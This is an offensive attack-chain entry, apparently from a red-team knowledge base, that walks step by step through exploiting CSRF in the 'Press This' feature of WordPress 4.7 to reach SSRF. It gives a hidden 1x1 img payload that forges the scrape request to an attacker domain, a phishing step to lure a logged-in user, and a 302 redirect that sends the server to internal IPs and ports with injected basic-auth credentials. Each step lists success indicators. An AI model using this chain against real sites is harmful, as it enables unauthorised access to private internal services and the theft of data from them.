---
id: ac-wordpress-csrf-ssrf-001
tags:
  - csrf
  - ssrf
  - wordpress
  - internal-access
  - private-ip
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Create-CSRF-Payload-for-Press-This-Scrape]]'
  - '[[procedures/Host-Redirect-Endpoint-for-SSRF]]'
  - '[[procedures/Trigger-SSRF-via-Authenticated-User]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T04:09:00.739Z'
description: >-
  A multi-stage attack exploiting CSRF in WordPress 4.7's Press This feature to
  achieve SSRF, allowing access to internal private IPs and ports with injected
  basic authentication.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
---
id: ac-wordpress-csrf-ssrf-001
name: WordPress 4.7 CSRF to HTTP SSRF for Internal Network Access
type: attack_chain
description: A multi-stage attack exploiting CSRF in WordPress 4.7's Press This feature to achieve SSRF, allowing access to internal private IPs and ports with injected basic authentication.
verified: false
submitted: false
step_count: 5
created_at: 2024-01-01T00:00:00Z
updated_at: 2024-01-01T00:00:00Z
procedures: [[procedures/Create-CSRF-Payload-for-Press-This-Scrape]], [[procedures/Host-Redirect-Endpoint-for-SSRF]], [[procedures/Trigger-SSRF-via-Authenticated-User]]
techniques: [[Exploit Public-Facing Application]], [[Drive-by Compromise]]
tactics: [[Initial Access]], [[Execution]]
tags: csrf, ssrf, wordpress, internal-access, private-ip
platforms: Web
tools: []
complexity: medium
skill_level: intermediate
impact_level: high
---

# WordPress 4.7 CSRF to HTTP SSRF for Internal Network Access

Multi-stage attack chain demonstrating a complete attack workflow exploiting a CSRF vulnerability in WordPress 4.7's 'Press This' feature to trigger server-side request forgery (SSRF), bypassing IP and port restrictions to access internal services on private networks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare CSRF Payload] --> B[Host Redirect Server]
    B --> C[Lure Authenticated Victim]
    C --> D[WP Server Scrapes and Follows Redirect]
    D --> E[Access Internal Services via SSRF]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web server (e.g., Apache or Nginx) for hosting the malicious page and redirect endpoint
- Domain control for a valid external hostname

### Target Environment

- WordPress 4.7 running on a PHP-enabled web server
- 'Press This' feature enabled (default in wp-admin)
- Internal services on private IPs/ports (e.g., 192.168.0.1:12345, 127.0.0.1:11211)
- Ports: 80, 443, 8080 (external), 12345, 11211 (internal)

### Initial Access Requirements

- No prior credentials needed, but victim must be authenticated WordPress user with 'Press This' privileges
- Attacker must control a domain resolvable by the target server
- Network position: External to the target, able to host content

## Detailed Attack Procedures

### Step 1: Craft CSRF Payload
procedure: [[procedures/Create-CSRF-Payload-for-Press-This-Scrape]]

**Objective**: Create a malicious webpage that forges a request to trigger the Press This scrape function without user knowledge.

**Instructions**: Develop an HTML page with an img tag or form that submits a GET request to the target's wp-admin/press-this.php. Set the 'u' parameter to your controlled domain (e.g., http://attackers-domain.com) and include url-scan-submit=Scan to initiate scraping.

Example payload in HTML:

```html
<img src="https://target.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan" width="1" height="1">
```

Host this page on your server.

**Expected Output**: The page loads silently, sending the forged request when visited.

**Success Indicators**:
- Payload HTML file created and hosted
- Request verifiable via browser dev tools

### Step 2: Lure Victim to Malicious Page
procedure: [[procedures/Trigger-SSRF-via-Authenticated-User]]

**Objective**: Induce an authenticated WordPress user to visit the malicious page, triggering the CSRF request from their browser.

**Instructions**: Distribute the malicious page URL via phishing, social engineering, or embedding in a trusted site. Ensure the victim is logged into the target WordPress site with sufficient privileges for Press This.

No specific command; monitor access logs on your malicious page host to confirm visit.

**Expected Output**: Victim's browser sends the GET request to wp-admin/press-this.php.

**Success Indicators**:
- Access log entry for the malicious page from victim's IP
- Target server receives the forged request (check WP logs if accessible)

### Step 3: Server Scrapes Attacker's Domain
procedure: [[procedures/Trigger-SSRF-via-Authenticated-User]]

**Objective**: Have the WordPress server fetch content from the attacker's controlled domain as part of the Press This feature.

**Instructions**: Upon receiving the CSRF request, WordPress automatically issues an HTTP GET to http://attackers-domain.com to scrape content. No action needed from attacker here; it's triggered by the prior step.

**Expected Output**: Incoming request to your server from the WordPress instance (visible in server logs).

**Success Indicators**:
- Server log shows GET request from target's IP/User-Agent: Press This (WordPress/4.7-RC1)

### Step 4: Respond with Redirect to Internal Endpoint
procedure: [[procedures/Host-Redirect-Endpoint-for-SSRF]]

**Objective**: Redirect the scraping request to a private internal IP:port, injecting basic-auth if needed.

**Instructions**: Configure your server to return a 302 redirect with Location header pointing to the target internal service, e.g., http://admin:pass@192.168.0.1:12345 or http://127.0.0.1:11211.

Example server response (in HTTP headers):

```
HTTP/1.1 302 Found
Location: http://admin:admin@192.168.0.1:12345/
```

**Expected Output**: Redirect response sent to WordPress server.

**Success Indicators**:
- Log confirms 302 response to scraping request

### Step 5: WordPress Follows Redirect for SSRF
procedure: [[procedures/Trigger-SSRF-via-Authenticated-User]]

**Objective**: Exploit the lack of redirect validation to make WordPress issue a request to the internal endpoint, including any basic-auth from the URL.

**Instructions**: The WordPress scrape function blindly follows the redirect, sending a GET to the internal URL with Authorization header (e.g., Basic YWRtaW46YWRtaW4= for admin:admin) and User-Agent: Press This.

Monitor the internal service logs for the incoming request from WordPress server.

**Expected Output**: Internal service receives request from WordPress IP, potentially with auth, allowing data access or further compromise.

**Success Indicators**:
- Internal service log shows request from target server
- Response data leaked or action performed (e.g., Memcached query on 11211)

## Attack Chain Summary

### Key Achievements

1. Bypassed CSRF protections to trigger internal scraping without direct access
2. Evaded IP/port filters via external redirect chaining
3. Accessed private network services with injected credentials, enabling reconnaissance or exploitation of internal endpoints

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Drive-by Compromise]] Drive-by Compromise

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2024-01-01T00:00:00Z*
